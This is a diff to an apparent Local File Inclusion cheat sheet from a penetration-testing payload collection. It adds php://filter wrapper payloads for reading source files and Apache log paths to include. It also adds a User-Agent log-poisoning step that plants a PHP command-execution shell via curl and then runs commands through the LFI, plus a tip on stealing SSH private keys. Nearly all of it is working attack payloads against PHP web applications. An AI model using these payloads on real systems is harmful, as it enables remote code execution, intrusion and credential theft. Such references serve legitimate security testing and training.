@@ -35,6 +35,7 @@
 * [Kadimus - https://github.com/P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus)
 * [LFISuite - https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)
 * [fimap - https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)
+* [panoptic - https://github.com/lightos/Panoptic](https://github.com/lightos/Panoptic)
 
 ## Basic LFI
 
@@ -122,6 +123,7 @@ The part "php://filter" is case insensitive
 
 ```powershell
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
 http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
 ```
@@ -132,7 +134,9 @@ can be chained with a compression wrapper for large files.
 http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 ```
 
-NOTE: Wrappers can be chained multiple times : `php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s`
+NOTE: Wrappers can be chained multiple times using `|` or `/`: 
+- Multiple base64 decodes: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`
+- deflate then base64encode (useful for limited character exfil): `php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`
 
 ```powershell
 ./kadimus -u "http://example.com/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page 
@@ -271,8 +275,13 @@ print('[x] Something went wrong, please try again')
 
 ## LFI to RCE via phpinfo()
 
-https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
+PHPinfo() displays the content of any variables such as **$_GET**, **$_POST** and **$_FILES**.
+
+> By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.
+
 Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)
+
+Research from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
 
 ## LFI to RCE via controlled log file
 
@@ -281,6 +290,8 @@ Just append your PHP code into the log file by doing a request to the service (A
 ```powershell
 http://example.com/index.php?page=/var/log/apache/access.log
 http://example.com/index.php?page=/var/log/apache/error.log
+http://example.com/index.php?page=/var/log/apache2/access.log
+http://example.com/index.php?page=/var/log/apache2/error.log
 http://example.com/index.php?page=/var/log/nginx/access.log
 http://example.com/index.php?page=/var/log/nginx/error.log
 http://example.com/index.php?page=/var/log/vsftpd.log
@@ -334,6 +345,22 @@ In some cases you can also send the email with the `mail` command line.
 mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
 ```
 
+### RCE via Apache logs
+
+Poison the User-Agent in access logs:
+
+```
+$ curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
+```
+
+Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.
+
+Then request the logs via the LFI and execute your command.
+
+```
+$ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
+```
+
 ## LFI to RCE via PHP sessions
 
 Check if the website use PHP Session (PHPSESSID)
@@ -343,7 +370,7 @@ Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
 Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
 ```
 
-In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] files
+In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/session/sess_[PHPSESSID] files
 
 ```javascript
 /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
@@ -387,6 +414,9 @@ http://example.com/index.php?page=../../../../../../etc/shadow
 
 Then crack the hashes inside in order to login via SSH on the machine.
 
+Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa.
+If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.
+
 ## References
 
 * [OWASP LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
@@ -401,6 +431,5 @@ Then crack the hashes inside in order to login via SSH on the machine.
 * [Чтение файлов => unserialize !](https://rdot.org/forum/showthread.php?t=4379)
 * [New PHP Exploitation Technique - 14 Aug 2018 by Dr. Johannes Dahse](https://blog.ripstech.com/2018/new-php-exploitation-technique/)
 * [It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
-* [Local file inclusion mini list - Penetrate.io](https://penetrate.io/2014/09/25/local-file-inclusion-mini-list/)
 * [CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a)
 * [Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html?m=1)
